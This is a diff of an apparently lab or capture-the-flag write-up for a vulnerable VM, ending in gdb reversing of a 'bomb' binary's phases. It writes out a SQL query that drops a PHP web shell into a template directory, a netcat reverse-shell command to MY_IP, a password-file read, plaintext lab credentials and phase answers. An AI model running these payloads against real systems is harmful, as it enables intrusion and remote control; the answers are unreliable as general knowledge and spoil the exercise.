@@ -44,9 +44,11 @@ If we go here ip_machine/icons/README, we see that the server is running on apac
 We need this command
 INSERT INTO `mlf2_entries_cache`(`cache_id`, `cache_text`) VALUES (12,LOAD_FILE("/var/www/forum/index.php"))
 
+We have the right to write in compile dir
+
 If we look at the code we have directory, we can try to put in some file with that mysql command
 
-select "<?php system($_GET['cmd']); ?>" into outfile "/var/www/abs_path/test.php"
+select "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/test.php"
 
 the good dir is /var/www/forum/templates_c/test.php (who is the compile dir in index.php)
 
@@ -56,6 +58,7 @@ launch on kali : nc -nvlp 1234
 cmd in the php exploit : mknod /tmp/backpipe p; /bin/sh 0</tmp/backpipe | nc MY_IP 1234 1>/tmp/backpipe
 
 directory /home/LOOKATME
+cd /home/LOOKATME; cat password
 there is something on the password
 user: lmezard
 pwd: G!@M6f4Eatau{sF"
@@ -75,9 +78,15 @@ pwd: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
 
 We see the bomb with a file readme
 Bomb is compiled, we use hexray (ida64)
+
+PHASE_1
+
 We see that the first_phase is a strcmp with "Public speaking is very easy."
 We type it -> victory
 We can see the adress with gdb if we disas phase_1 and p/s (for the character) and the adress of the register
+
+
+PHASE_2
 
 we need to disas phase_2,
 got this line :
@@ -92,3 +101,13 @@ got this line :
  	0x08048b69 <+33>:	call   0x80494fc <explode_bomb>
  	- Here if the first number of ebp isn't 1 we don't jump and we explode
 
+
+After that we launch gdb (yeah), and we disas phase_2 and put a breakpoint just before the cmp which is just before the explosion
+and we look at eax register each time with "info r"
+break *0x08048b7e
+
+We got 1 2 6 24 120 720
+
+PHASE_3
+
+REGISTRE A LA CON : eax<=2 && ebp>7
